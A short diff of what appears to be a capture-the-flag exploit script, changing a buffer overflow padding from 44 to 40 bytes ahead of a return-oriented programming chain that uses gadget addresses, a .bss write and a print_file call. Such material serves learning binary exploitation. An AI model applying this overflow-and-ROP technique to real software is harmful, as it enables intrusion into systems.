@@ -30,7 +30,7 @@ pop_r14_r15 = 0x400690
 mov_r14_r15 = 0x400628
 print_file  = 0x400510
 
-pay = b'A' * 44
+pay = b'A' * 40
 pay += p64(ret)
 pay += p64(pop_r14_r15)
 pay += p64(bss)
